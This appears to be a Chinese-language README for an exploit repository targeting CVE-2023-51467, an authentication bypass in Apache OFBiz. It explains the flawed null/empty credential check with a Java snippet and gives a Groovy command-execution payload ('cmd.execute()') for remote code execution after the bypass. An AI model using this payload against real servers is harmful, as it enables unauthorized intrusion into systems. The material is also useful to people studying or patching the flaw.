# CVE-2023-51467
exp.py 改为命令执行



## Post.txt
序列化漏洞利用
## bypassauth.txt
身份验证绕过测试

## 漏洞原因
由于在身份校验时错误使用空来进行判断，这种方式并未起到效果，导致身份验证被绕过。
```

        if (username == null) username = (String) session.getAttribute("USERNAME");
        if (password == null) password = (String) session.getAttribute("PASSWORD");
        if (token == null) token = (String) session.getAttribute("TOKEN");
        if (UtilValidate.isEmpty(username)) username = (String) session.getAttribute("USERNAME");
        if (UtilValidate.isEmpty(password)) password = (String) session.getAttribute("PASSWORD");
        if (UtilValidate.isEmpty(token)) token = (String) session.getAttribute("TOKEN");


```

## 直接命令执行
有人分析文直接命令执行，但是这种需要绕过groovy过滤。
或者有什么比较好的执行入口。
rce.txt
```def cmd = "your-shell-command"
def process = cmd.execute()
process.waitFor()
println "Exit code: ${process.exitValue()}"
println "Output:\n${process.text}"```

## 参考
https://github.com/apache/ofbiz-framework/commit/47e7959065b82b170da5c330ed5c17af16415ede#diff-68decfd4946b8ef0adcc4c7f18b938aec4a07ff7ce64609a2691ba88a4688607
https://mp.weixin.qq.com/s/vdyqfm0FkbKp5W2LilhbXA
请勿用于非法用途
